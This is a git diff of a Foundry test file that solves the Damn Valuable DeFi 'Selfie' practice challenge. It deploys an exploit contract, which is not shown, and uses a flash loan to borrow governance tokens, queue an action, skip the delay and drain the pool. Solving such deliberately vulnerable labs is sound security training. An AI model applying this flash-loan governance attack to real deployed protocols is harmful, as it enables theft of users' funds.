@@ -7,6 +7,8 @@ import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
 
+import {ExploitSelfie} from "../../src/selfie/ExploitSelfie.sol";
+
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -62,7 +64,17 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        // deploy exploit contract
+        ExploitSelfie exploitContract = new ExploitSelfie(pool, address(governance), recovery);
+
+        // set up the exploit: borrow tokens via flash loan and queue the action, and repay the flash loan.
+        require(exploitContract.exploitSetUp(), "Exploit setup failed");
+
+        // fast forward time by 2 days to surpass action delay
+        vm.warp(block.timestamp + 2 days);
+
+        // close up the exploit: execute the queued action to drain all tokens to recovery address
+        require(exploitContract.exploitCloseUp(), "Exploit close up failed");
     }
 
     /**
